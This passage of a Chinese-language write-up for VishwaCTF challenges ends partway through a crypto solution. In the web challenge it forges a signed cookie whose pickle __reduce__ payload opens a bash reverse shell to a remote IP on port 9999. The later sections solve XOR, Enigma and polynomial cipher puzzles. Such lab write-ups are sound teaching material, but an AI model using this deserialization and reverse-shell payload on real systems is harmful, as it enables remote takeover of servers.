<p>原本我嘗試去偽造admin cookie但只顯示了這個<br><div class="img-item" data-src="https://hackmd.io/_uploads/rJVgj1Lp6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJVgj1Lp6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>後來我去看了一下這個頁面，真的甚麼都沒有，這樣的話，感覺要RCE才能夠找到flag<br><div class="img-item" data-src="https://hackmd.io/_uploads/S1ZIikUTT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1ZIikUTT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>先後嘗試了SSTI但都沒成果<br>後來看了一陣子<br>我先去看了<code>get_cookie()</code>的底層，他去調用了<code>cookie_decode()</code><br>嘗試去找了<code>cookie_decode()</code>的底層，發現有pickle可以用來RCE!!!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Verify and decode an encoded string. Return an object or None.&#x27;&#x27;&#x27;</span></span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>透過偽造cookie的方式，在cookie列中塞入payload來達成反序列化的RCE<br>使用pickle來RCE可以使用<code>__reduce__</code>(傳回一個元組，第一個值是一個函數，第二個值是傳遞給函數的參數)<br>pickle.loads被呼叫時，它將使用參數來呼叫該函數</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">Vishwa = <span class="string">&quot;trrrrrrrrrrrrryyyyyyyyyyyharddddddddd&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;&quot;</span>   <span class="comment">#填入ip</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;remote_ip&#125;</span>/9999 0&gt;&amp;1&#x27;&quot;</span>             </span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">s = pickle.dumps(a)</span><br><span class="line">msg = base64.b64encode(s)</span><br><span class="line">sig = base64.b64encode(hmac.new(tob(Vishwa), msg, digestmod=hashlib.md5).digest())</span><br><span class="line"></span><br><span class="line">payload = tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(s)</span><br></pre></td></tr></table></figure>
<p>將payload修改到cookie裡面，就可以彈回reverse shell到port 9999</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1m40J86p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1m40J86p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>原本以為要提權但發現他可以執行，執行就可以拿到flag了<br><div class="img-item" data-src="https://hackmd.io/_uploads/rkTLRJUpp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkTLRJUpp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>簡單來說，他需要你從 LFI -&gt; 底層 -&gt; pickle -&gt; 偽造cookie -&gt; RCE -&gt; reverse shell -&gt; Get flag</p>
<p>相當有趣的一題</p>
<blockquote>
<p>FLAG: VishwaCTF{W3lcome_t0_p03m_p0ck3t}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Happy-Valentine’s-Day"><a href="#Happy-Valentine’s-Day" class="headerlink" title="Happy Valentine’s Day"></a>Happy Valentine’s Day</h2><p>他把自己圖片的前8位跟自己做了xor，所以該圖片前8位都變成了0，<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJnJlv76p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJnJlv76p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> [i^j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, cycle(b))]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;original.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">key = [f[<span class="number">0</span>], f[<span class="number">1</span>], f[<span class="number">2</span>], f[<span class="number">3</span>], f[<span class="number">4</span>], f[<span class="number">5</span>], f[<span class="number">6</span>], f[<span class="number">7</span>]]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytearray</span>(xor(f,key))</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(enc)</span><br></pre></td></tr></table></figure>
<p>我只要能找出key，在做一次xor就可以還原圖片，我嘗試去研究了.jpg的特性。發現了:</p>
<ul>
<li>png檔案固定開頭<code>[0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]</code></li>
</ul>
<h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(i^j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, cycle(b)))</span><br><span class="line"></span><br><span class="line">enc_data = <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment">#0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A -&gt; png</span></span><br><span class="line"><span class="comment">#137, 80, 78, 71, 13, 10, 26, 10 -&gt; jpg</span></span><br><span class="line">key = [<span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>, <span class="number">0x1A</span>, <span class="number">0x0A</span>]</span><br><span class="line"></span><br><span class="line">decrypted_data = xor(enc_data, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;decrypted_image.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(decrypted_data)</span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/HyChGwmTT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyChGwmTT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>FLAG: VishwaCTF{h3ad3r5_f0r_w1nn3r5}</p>
</blockquote>
<h2 id="Teyvat-Tales"><a href="#Teyvat-Tales" class="headerlink" title="Teyvat Tales"></a>Teyvat Tales</h2><p>要解密的<br><div class="img-item" data-src="https://hackmd.io/_uploads/r161ge8pp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r161ge8pp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>可以找到他的js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> submitBtn1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submit-btn-1&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> firstFour = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.first-four&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> submitBtn2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submit-btn-2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> secFour = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.sec-four&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> submitBtn3 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submit-btn-3&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> thirdFour = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.third-four&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> submitBtn4 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submit-btn-4&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fourthFour = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.fourth-four&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">submitBtn1.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> inputText1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input1&quot;</span>).<span class="property">value</span>.<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputText1.<span class="title function_">toLowerCase</span>() === <span class="string">&quot;enigma m3&quot;</span>) &#123;</span><br><span class="line">        firstFour.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;centered-align&quot;</span>);</span><br><span class="line">        firstFour.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;hidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect deciphering! Try again!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">submitBtn2.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> inputText2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input2&quot;</span>).<span class="property">value</span>.<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputText2.<span class="title function_">toLowerCase</span>() === <span class="string">&quot;ukw c&quot;</span>) &#123;</span><br><span class="line">        secFour.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;centered-align&quot;</span>);</span><br><span class="line">        secFour.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;hidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect deciphering! Try again!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">submitBtn3.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> inputText3 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input3&quot;</span>).<span class="property">value</span>.<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputText3.<span class="title function_">toLowerCase</span>() === <span class="string">&quot;rotor1 i p m rotor2 iv a o rotor3 vi i n&quot;</span>) &#123;</span><br><span class="line">        thirdFour.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;centered-align&quot;</span>);</span><br><span class="line">        thirdFour.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;hidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect deciphering! Try again!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">submitBtn4.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> inputText4 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input4&quot;</span>).<span class="property">value</span>.<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputText4.<span class="title function_">toLowerCase</span>() === <span class="string">&quot;vi sh wa ct fx&quot;</span>) &#123;</span><br><span class="line">        fourthFour.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;centered-align&quot;</span>);</span><br><span class="line">        fourthFour.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;hidden&quot;</span>);        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect deciphering! Try again!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>看起來很像<code>Enigma machine</code><br>直接將他給的丟進去<br><a target="_blank" rel="noopener" href="https://cryptii.com/">https://cryptii.com/</a></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SycAkeLTT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SycAkeLTT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>FLAG: VishwaCTF{beware_of_tone-deaf_bard}</p>
</blockquote>
<h2 id="Poly-Fun"><a href="#Poly-Fun" class="headerlink" title="Poly Fun"></a>Poly Fun</h2><p>題目:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">polyc = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line">poly = np.poly1d(polyc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_number</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        num = random.randint(<span class="number">100</span>, <span class="number">999</span>)</span><br><span class="line">        first_digit = num // <span class="number">100</span></span><br><span class="line">        last_digit = num % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(first_digit - last_digit) &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_number_again</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        num = random.randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">1111</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">num</span>):</span><br><span class="line">    number = random.randint(<span class="number">1</span>, <span class="number">100000</span>)</span><br><span class="line">    org = number</span><br><span class="line">    number *= <span class="number">2</span></span><br><span class="line">    number += <span class="number">15</span></span><br><span class="line">    number *= <span class="number">3</span></span><br><span class="line">    number += <span class="number">33</span></span><br><span class="line">    number /= <span class="number">6</span></span><br><span class="line">    number -= org</span><br><span class="line">    <span class="keyword">if</span> number == <span class="number">13</span>:</span><br><span class="line">        num1 = random.randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">        num2 = random.randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">        number = num1 * <span class="number">2</span></span><br><span class="line">        number += <span class="number">5</span></span><br><span class="line">        number *= <span class="number">5</span></span><br><span class="line">        number += num2</span><br><span class="line">        number -= <span class="number">25</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(number / <span class="number">10</span>) == num1 <span class="keyword">and</span> number % <span class="number">10</span> == num2:</span><br><span class="line">            number = generate_random_number()</span><br><span class="line">            num1 = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(<span class="built_in">str</span>(number), reverse=<span class="literal">True</span>)))</span><br><span class="line">            num2 = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(<span class="built_in">str</span>(number))))</span><br><span class="line">            diff = <span class="built_in">abs</span>(num1 - num2)</span><br><span class="line">            rev_diff = <span class="built_in">int</span>(<span class="built_in">str</span>(diff)[::-<span class="number">1</span>])</span><br><span class="line">            number = diff + rev_diff</span><br><span class="line">            <span class="keyword">if</span> number == <span class="number">1088</span>:</span><br><span class="line">                org = num</span><br><span class="line">                num *= <span class="number">2</span></span><br><span class="line">                num /= <span class="number">3</span></span><br><span class="line">                num += <span class="number">5</span></span><br><span class="line">                num *= <span class="number">4</span></span><br><span class="line">                num -= <span class="number">9</span></span><br><span class="line">                num -= org</span><br><span class="line">                <span class="keyword">return</span> num</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                number = generate_random_number_again()</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span> number != <span class="number">6174</span>:</span><br><span class="line">                    digits = [<span class="built_in">int</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">str</span>(number)]</span><br><span class="line">                    digits.sort()</span><br><span class="line">                    smallest = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, digits)))</span><br><span class="line">                    digits.reverse()</span><br><span class="line">                    largest = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, digits)))</span><br><span class="line">                    number = largest - smallest</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> i &lt;= <span class="number">7</span>:</span><br><span class="line">                    org = num</span><br><span class="line">                    num *= <span class="number">2</span></span><br><span class="line">                    num += <span class="number">7</span></span><br><span class="line">                    num += <span class="number">5</span></span><br><span class="line">                    num -= <span class="number">12</span></span><br><span class="line">                    num -= org</span><br><span class="line">                    num += <span class="number">4</span></span><br><span class="line">                    num *= <span class="number">2</span></span><br><span class="line">                    num -= <span class="number">8</span></span><br><span class="line">                    num -= org</span><br><span class="line">                    <span class="keyword">return</span> num</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    org = num</span><br><span class="line">                    num **= <span class="number">4</span></span><br><span class="line">                    num /= <span class="number">9</span></span><br><span class="line">                    num += <span class="number">55</span></span><br><span class="line">                    num *= <span class="number">6</span></span><br><span class="line">                    num += <span class="number">5</span></span><br><span class="line">                    num -= <span class="number">23</span></span><br><span class="line">                    num -= org</span><br><span class="line">                    <span class="keyword">return</span> num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            org = num</span><br><span class="line">            num *= <span class="number">10</span></span><br><span class="line">            num += <span class="number">12</span></span><br><span class="line">            num **= <span class="number">3</span></span><br><span class="line">            num -= <span class="number">6</span></span><br><span class="line">            num += <span class="number">5</span></span><br><span class="line">            num -= org</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        org = num</span><br><span class="line">        num += <span class="number">5</span></span><br><span class="line">        num -= <span class="number">10</span></span><br><span class="line">        num *= <span class="number">2</span></span><br><span class="line">        num += <span class="number">12</span></span><br><span class="line">        num -= <span class="number">20</span></span><br><span class="line">        num -= org</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">p,key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(p(transform(i))) <span class="keyword">for</span> i <span class="keyword">in</span> key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">enc = encrypt(poly,key)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>題目也有給我key跟enc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key_enc: ☞➭⥄⫣Ⲋ⸹⿰ㆯ㍶☞⒗☞☞☞➭☞⥄☞⫣☞Ⲋ☞⸹☞⿰☞ㆯ☞㍶➭⒗➭</span><br><span class="line">flag_enc: u5FUKxDUxH9y8yxvfaaU+GSXDwvJS6QxlN/3udOEzpU6fIVUExjDLsB3LKqUTz/x</span><br></pre></td></tr></table></figure>
<p>先分析那陀又臭又長的<code>transform(num)</code><br>然後你就可以直接知道他只是在唬爛你<br>實際上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transform(num)=num</span><br></pre></td></tr></table></figure>
<p>所以可以把題目化簡成這樣</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">polyc = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line">poly = np.poly1d(polyc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">p,key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(p(i)) <span class="keyword">for</span> i <span class="keyword">in</span> key)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">enc = encrypt(poly,key)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure>
